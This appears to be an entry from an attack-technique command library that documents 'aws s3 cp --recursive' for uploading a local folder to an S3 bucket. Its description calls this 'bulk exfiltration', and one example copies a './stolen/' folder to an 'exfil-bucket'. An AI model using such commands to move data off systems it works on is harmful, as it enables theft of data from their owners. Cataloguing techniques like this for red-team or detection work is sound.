---
id: db0b46a3-d2f0-4346-860e-ea76fac9d4bc
name: aws s3 copy folder to bucket recursively
type: command
executor: bash
data: |
  aws s3 cp $FOLDER s3://$AWS_S3_BUCKET/ --recursive
output: null
created_at: '2020-07-31T04:25:22.639440+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - AWS
  - Linux
tags:
  - aws
  - s3
  - upload
  - recursive
verified: true
validated: true
---

# aws s3 copy folder to bucket recursively

## Command

```bash
aws s3 cp $FOLDER s3://$AWS_S3_BUCKET/ --recursive
```

## Description

Recursively copies all contents of a local folder to the root of an S3 bucket, preserving directory structure for bulk exfiltration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $FOLDER | Local folder path to upload (e.g., /data/) | Yes |
| $AWS_S3_BUCKET | Target S3 bucket | Yes |
| --recursive | Flag to include all subdirectories and files | Yes |

## Examples

### Basic Usage

```bash
aws s3 cp ./stolen/ s3://exfil-bucket/ --recursive
```

### Advanced Usage

```bash
aws s3 cp /tmp/dump/ s3://my-bucket/ --recursive --exclude "*.tmp"
```

## Expected Output

Per-file upload progress, ending with summary of total files and bytes transferred.

## Related

- [[procedures/aws-copy-files-or-folder-to-s3-bucket]]
